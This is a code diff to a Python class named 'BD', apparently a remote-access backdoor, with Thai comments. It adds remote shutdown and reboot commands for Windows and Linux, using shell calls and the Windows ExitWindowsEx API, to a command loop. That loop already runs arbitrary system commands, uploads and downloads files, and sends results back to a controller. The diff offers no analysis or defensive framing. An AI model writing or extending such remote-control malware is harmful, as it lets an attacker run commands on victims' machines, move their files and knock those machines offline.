@@ -10,6 +10,7 @@ import time
 import os
 import base64
 import pkg_resources
+import ctypes
 
 
 class BD:
@@ -152,6 +153,55 @@ class BD:
             return "[+] Upload successful"
         except Exception as e:
             return f"[-] Write file error: {str(e)}"
+        
+    def system_shutdown(self):
+        try:
+            if platform.system().lower() == 'windows':
+                try:
+                    # วิธีที่ 1: ใช้ os.system
+                    os.system('shutdown /s /t 0')
+                except:
+                    try:
+                        # วิธีที่ 2: ใช้ subprocess
+                        subprocess.run(['shutdown', '/s', '/t', '0'], shell=True)
+                    except:
+                        try:
+                            # วิธีที่ 3: ใช้ ctypes
+                            user32 = ctypes.WinDLL('user32')
+                            user32.ExitWindowsEx(0x00000001, 0)
+                        except:
+                            return "[-] Shutdown failed"
+            else:
+                # สำหรับ Linux/Unix
+                os.system('shutdown -h now')
+            return "[+] Shutdown command executed"
+        except Exception as e:
+            return f"[-] Shutdown error: {str(e)}"
+        
+
+    def system_reboot(self):
+        try:
+            if platform.system().lower() == 'windows':
+                try:
+                    # วิธีที่ 1 ใช้ os.system
+                    os.system('shutdown /r /t 0')
+                except:
+                    try:
+                        # วิธีที่ 2 ใช้ subprocess
+                        subprocess.run(['shutdown', '/r', '/t', '0'], shell=True)
+                    except:
+                        try:
+                            # วิธีที่ 3 ใช้ ctypes
+                            user32 = ctypes.WinDLL('user32')
+                            user32.ExitWindowsEx(0x00000002, 0)
+                        except:
+                            return "[-] Reboot failed"
+            else:
+                # สำหรับ Linux/Unix
+                os.system('reboot')
+            return "[+] Reboot command executed"
+        except Exception as e:
+            return f"[-] Reboot error: {str(e)}"
 
     def run_cmd(self):
         while True:
@@ -172,6 +222,12 @@ class BD:
                 elif cmd[0] == "download" and len(cmd) > 1:
                     cmd_result = self.download_file(cmd[1])
                 
+                elif cmd[0] == "shutdown":
+                    cmd_result = self.system_shutdown()
+                
+                elif cmd[0] == "reboot":
+                    cmd_result = self.system_reboot()
+
                 else:
                     cmd_result = self.execute_sys_cmd(cmd)
 
@@ -179,7 +235,7 @@ class BD:
 
             except Exception as e:
                 try:
-                    self.connect_send(f"[-] Error during command execution: {str(e)}")
+                    self.connect_send(f"[-] Error command execution: {str(e)}")
                 except:
                     break
 
